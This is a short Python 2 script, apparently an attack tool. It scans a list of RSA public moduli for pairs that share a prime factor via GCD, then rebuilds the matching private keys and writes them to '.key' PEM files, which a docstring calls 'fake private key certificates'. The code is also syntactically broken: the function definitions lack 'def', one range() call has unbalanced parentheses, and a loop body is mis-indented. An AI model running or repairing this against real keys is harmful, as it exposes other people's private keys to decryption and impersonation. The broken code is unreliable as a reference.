from RSATool import *

class Cracker:

	__init__(self, ModulusList):
		self._ModulusList = ModulusList

	@abstractmethod
	CrackAndReturnFactors(self):
		pass

class CrackerImpl(Cracker):

	CrackAndReturnFactors(self):
		for i in range(0, self._ModulusList.getListLength()) - 1):
		record1 = self._ModulusList.getListElement(i)
		for j in range(i, self._ModulusList.getListLength() - 1):
			record2 = self._ModulusList.getListElement(j+1)
			ngcd = gcd(record1[1], record2[1])
			if ngcd != 1 and ngcd != record1[1] and ngcd != record2[1]:
				print "[+] Found keys for " + record1[0] + " and " + record2[0] + "."
				forgeKeys(record1, record2, ngcd)

def forgeKeys(record1, record2, gcd):
	'''
	Create fake private key certificates using common factor of record modulus values.
	'''
	rsa1 = RSA(p = gcd, q = record1[1]/gcd, e = record1[2])
	key1 = rsa1.to_pem()
	f = open(record1[0] + ".key", 'wb')
	f.write(key1)
	f.close()
	rsa2 = RSA(p = gcd, q = record2[1]/gcd, e = record2[2])
	key2 = rsa2.to_pem()
	f = open(record2[0] + ".key", 'wb')
	f.write(key2)
	f.close()

def gcd(a, b):
	while b:
		a, b = b, a%b
	return a